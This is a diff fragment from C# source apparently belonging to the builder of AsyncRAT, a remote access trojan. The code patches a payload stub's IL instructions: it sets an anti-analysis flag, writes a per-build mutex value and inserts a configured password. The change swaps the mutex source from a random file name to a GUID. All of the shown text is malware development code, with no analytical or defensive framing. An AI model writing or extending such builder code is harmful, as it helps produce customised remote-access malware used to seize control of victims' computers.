@@ -56,7 +56,7 @@ namespace AsyncRAT_Sharp.Forms
                                         method.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
-                                        method.Body.Instructions[i].Operand = Path.GetRandomFileName();
+                                        method.Body.Instructions[i].Operand = Guid.NewGuid().ToString();
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
                                         method.Body.Instructions[i].Operand = Settings.Password;
